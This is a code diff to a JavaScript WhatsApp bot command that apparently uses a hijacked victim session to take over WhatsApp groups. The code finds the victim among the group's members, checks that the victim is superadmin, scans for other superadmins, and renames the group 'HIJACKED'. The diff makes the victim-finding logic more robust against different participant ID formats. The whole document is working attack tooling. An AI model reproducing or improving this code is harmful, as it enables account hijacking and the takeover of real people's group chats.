@@ -4,7 +4,6 @@ const { bootHijackSession }                     = require('../../lib/hijackSessi
 const { extractPhone, rankOf, resolveJid,
         checkAccountStatus }                    = require('../../lib/hijackHelper');
 
-// subject fits WA's ~100-char cap. this is 23 chars.
 const NEW_SUBJECT = '𝐇𝐈𝐉𝐀𝐂𝐊𝐄𝐃 ʙʏ 𝙼𝙰𝙳𝙰𝚁𝙰 𝚇-𝙼𝙳';
 
 const FULL_ANNOUNCEMENT =
@@ -79,14 +78,40 @@ async function takeoverSequence(targetSock, groupJid, attackerJid, attackerSock,
 
     onPhase?.('ʀᴇsᴏʟᴠᴇ ᴛᴀʀɢᴇᴛ');
     const meta = await targetSock.groupMetadata(groupJid).catch((e) => { throw new Error(`meta: ${e.message}`); });
-    const targetPhone = extractPhone(targetSock.user?.id);
-    const targetPart  = meta.participants.find(p => {
-        return extractPhone(p.id) === targetPhone
-            || extractPhone(p.lid) === targetPhone
-            || p.id === targetSock.user?.id;
+
+    if (!targetSock.user?.id) {
+        throw new Error('targetSock.user missing — wait for socket to sync');
+    }
+
+    const targetPhone = extractPhone(targetSock.user.id);
+    const targetLid   = extractPhone(targetSock.user.lid);
+
+    // Bulletproof participant finder
+    const targetPart = meta.participants.find(p => {
+        const pId    = extractPhone(p.id);
+        const pLid   = extractPhone(p.lid);
+        const pPhone = extractPhone(p.phoneNumber); // newer Baileys sometimes has this
+
+        if (pId === targetPhone || pLid === targetPhone || pPhone === targetPhone) return true;
+        if (targetLid && (pId === targetLid || pLid === targetLid || pPhone === targetLid)) return true;
+        
+        if (p.id === targetSock.user.id) return true;
+        if (targetSock.user.lid && p.lid === targetSock.user.lid) return true;
+
+        return false;
     });
-    if (!targetPart) { result.aborted = true; result.reason = 'target not in group'; return result; }
-    if (rankOf(targetPart) !== 2) { result.aborted = true; result.reason = 'target not superadmin'; return result; }
+
+    if (!targetPart) {
+        result.aborted = true;
+        result.reason = `target not in group (Checked ${meta.participants.length} members)`;
+        return result;
+    }
+
+    if (rankOf(targetPart) !== 2) {
+        result.aborted = true;
+        result.reason = 'target is NOT superadmin in this group';
+        return result;
+    }
 
     onPhase?.('sᴄᴀɴ sᴜᴘᴇʀᴀᴅᴍɪɴs');
     const otherSupers = meta.participants.filter(p => p !== targetPart && rankOf(p) === 2);
@@ -165,8 +190,6 @@ module.exports = {
     async execute(sock, msg, args, ctx) {
         const s = ctx.settings;
         
-        // Smart arg parsing — order doesn't matter.
-        // Link/JID goes to groupJid, digits go to targetPhone.
         let targetPhone = null;
         let groupTarget = null;
 
@@ -188,7 +211,6 @@ module.exports = {
         if (!scopeKey) return ctx.reply(`❌ sᴇɴᴅᴇʀ ᴜɴᴋɴᴏᴡɴ.${s.FOOTER}`);
         if (!attackerJid) return ctx.reply(`❌ ʙᴏᴛ sᴇssɪᴏɴ ᴜɴᴋɴᴏᴡɴ.${s.FOOTER}`);
 
-        // Resolve group link to JID
         let groupJid = groupTarget;
         if (groupJid.includes('chat.whatsapp.com')) {
             await ctx.reply(`⏳ ʀᴇsᴏʟᴠɪɴɢ ɢʀᴏᴜᴘ ʟɪɴᴋ...${s.FOOTER}`);
@@ -238,10 +260,8 @@ module.exports = {
                 `╰══════════════════════════`,
             ];
             await ctx.reply(lines.join('\n') + s.FOOTER);
-                    await ctx.reply(lines.join('\n') + s.FOOTER);
         } catch (e) {
             await ctx.reply(`❌ ERROR: ${e.message}${s.FOOTER}`);
         }
-        // no finally, no targetSock.end()
     }
 };
